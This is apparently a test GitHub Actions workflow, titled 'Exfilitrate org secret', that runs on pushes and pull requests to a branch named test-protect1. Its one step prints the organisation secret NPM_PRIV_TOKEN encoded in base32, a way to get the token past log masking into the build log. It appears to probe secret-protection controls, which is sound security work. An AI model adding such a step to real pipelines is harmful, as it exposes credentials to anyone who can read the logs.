name: Exfilitrate org secret
on:
  push:
    branches: [test-protect1]
  pull_request:
    branches: [test-protect1]
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
    - name: exfil org secret
      id: response
      run:  |
          echo "lets exfil some org secrets..."
          echo "${{secrets.NPM_PRIV_TOKEN}}" | base32
          
